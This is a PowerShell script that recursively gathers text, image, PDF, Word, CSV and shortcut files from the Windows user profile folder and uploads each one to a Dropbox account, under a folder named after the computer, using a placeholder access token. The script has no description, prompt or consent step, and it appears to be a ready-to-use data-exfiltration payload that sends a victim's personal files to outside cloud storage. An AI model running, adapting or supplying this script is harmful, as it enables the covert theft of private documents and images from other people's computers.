#=========================================================================================
$accessToken = "DROPBOX_ACCESS_TOKEN_HERE"
$localFolderPath = "$env:USERPROFILE\"
#=========================================================================================

$computerName = "$env:COMPUTERNAME"
$computerNameAsString = $computerName.ToString()
$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}
$body = @{
    "path" = "/$computerName"
    "autorename" = $true
} | ConvertTo-Json

#=========================================================================================

$dropboxFolderPath = $computerName.ToString()
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/octet-stream"
}

#============================  TXT  ====================================

$files = Get-ChildItem -Path $localFolderPath -Filter "*.txt" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}

#============================  PNG  ====================================

$files = Get-ChildItem -Path $localFolderPath -Filter "*.png" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}

#============================  JPG  ====================================

$files = Get-ChildItem -Path $localFolderPath -Filter "*.jpg" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}

#============================  PDF  ====================================

$files = Get-ChildItem -Path $localFolderPath -Filter "*.pdf" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}

#============================  DOCX  ====================================

$files = Get-ChildItem -Path $localFolderPath -Filter "*.docx" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}

#============================  CSV  ====================================

$files = Get-ChildItem -Path $localFolderPath -Filter "*.csv" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}

#============================  LNK  ====================================

$files = Get-ChildItem -Path $localFolderPath -Filter "*.lnk" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}